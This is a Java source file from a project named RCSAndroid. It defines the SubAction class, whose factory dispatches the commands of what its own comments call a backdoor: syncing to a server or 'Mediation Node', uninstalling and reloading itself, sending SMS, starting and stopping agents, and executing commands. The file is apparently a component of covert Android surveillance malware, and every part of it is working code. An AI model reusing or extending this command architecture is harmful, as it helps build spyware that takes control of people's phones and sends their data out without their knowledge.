/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 03-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.action;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Status;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction implements Runnable {

	/** Actions definitions. */
	public static int ACTION = 0x4000;
	
	/** The Constant ACTION_SYNC. */
	public final static int ACTION_SYNC = 0x4001; // Sync su server
	
	/** The Constant ACTION_UNINSTALL. */
	public final static int ACTION_UNINSTALL = 0x4002; // Uninstall
	
	/** The Constant ACTION_RELOAD. */
	public final static int ACTION_RELOAD = 0x4003; // Reload della backdoor
	
	/** The Constant ACTION_SMS. */
	public final static int ACTION_SMS = 0x4004; // Invia un SMS
	
	/** The Constant ACTION_TOOTHING. */
	public final static int ACTION_TOOTHING = 0x4005; // Non utilizzata
	
	/** The Constant ACTION_START_AGENT. */
	public final static int ACTION_START_AGENT = 0x4006; // Avvia un agente
	
	/** The Constant ACTION_STOP_AGENT. */
	public final static int ACTION_STOP_AGENT = 0x4007; // Ferma un agente
	
	/** The Constant ACTION_SYNC_PDA. */
	public final static int ACTION_SYNC_PDA = 0x4008; // Sync su Mediation Node
	
	/** The Constant ACTION_EXECUTE. */
	public final static int ACTION_EXECUTE = 0x4009; // Esegui un comando
	
	/** The Constant ACTION_SYNC_APN. */
	public final static int ACTION_SYNC_APN = 0x400a; // Sync su APN
	
	/** The Constant ACTION_LOG. */
	public final static int ACTION_LOG = 0x400b; // Crea un LOG_INFO

	/** Action type. */
	private final int subActionType;

	/** Parameters. */
	private final byte[] subActionParams;

	/** The want uninstall. */
	protected boolean wantUninstall;
	
	/** The want reload. */
	protected boolean wantReload;
	
	/** The status. */
	Status status;

	/**
	 * Instantiates a new sub action.
	 *
	 * @param type the type
	 * @param params the params
	 */
	public SubAction(final int type, final byte[] params) {
		this.subActionType = type;
		this.subActionParams = params;
		this.status = Status.self();
	}

	/**
	 * Factory.
	 *
	 * @param type the type
	 * @param confParams the conf params
	 * @return the sub action
	 */
	public static SubAction factory(final int type, final byte[] confParams) {
		final Debug debug = new Debug();
		switch (type) {
		case SubAction.ACTION_SYNC:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC ***");
			// #endif
			return new SyncActionInternet(type, confParams);
		case ACTION_UNINSTALL:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_UNINSTALL ***");
			// #endif
			return new UninstallAction(type, confParams);
		case ACTION_RELOAD:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_RELOAD ***");
			// #endif
			return new ReloadAction(type, confParams);
		case ACTION_SMS:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SMS ***");
			// #endif
			return new SmsAction(type, confParams);
		case ACTION_TOOTHING:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_TOOTHING ***");
			// #endif
			return new ToothingAction(type, confParams);
		case ACTION_START_AGENT:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_START_AGENT ***");
			// #endif
			return new StartAgentAction(type, confParams);
		case ACTION_STOP_AGENT:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_STOP_AGENT ***");
			// #endif
			return new StopAgentAction(type, confParams);
		case ACTION_SYNC_PDA:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC_PDA ***");
			// #endif
			return new SyncPdaAction(type, confParams);
		case ACTION_EXECUTE:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_EXECUTE ***");
			// #endif
			return new ExecuteAction(type, confParams);
		case ACTION_SYNC_APN:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC ***");
			// #endif
			return new SyncActionApn(type, confParams);
		case ACTION_LOG:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_INFO ***");
			// #endif
			return new LogAction(type, confParams);
		default:
			return null;
		}
	}

	/**
	 * Gets the sub action type.
	 *
	 * @return the sub action type
	 */
	public int getSubActionType() {
		return subActionType;
	}

	/**
	 * Gets the sub action params.
	 *
	 * @return the sub action params
	 */
	public byte[] getSubActionParams() {
		return subActionParams;
	}

	/** The finished. */
	private boolean finished;

	/**
	 * Execute.
	 *
	 * @return true, if successful
	 */
	public abstract boolean execute();

	/**
	 * Checks if is finished.
	 *
	 * @return true, if is finished
	 */
	public synchronized boolean isFinished() {
		return finished;
	}

	/* (non-Javadoc)
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		try {
			execute();
		} finally {

			synchronized (this) {
				notify();
				finished = true;
			}
		}
	}

	/**
	 * Prepare execute.
	 */
	public void prepareExecute() {
		synchronized (this) {
			finished = false;
		}
	}

	/**
	 * Want uninstall.
	 *
	 * @return true, if successful
	 */
	public boolean wantUninstall() {
		// TODO Auto-generated method stub
		return false;
	}

	/**
	 * Want reload.
	 *
	 * @return true, if successful
	 */
	public boolean wantReload() {
		// TODO Auto-generated method stub
		return false;
	}
}
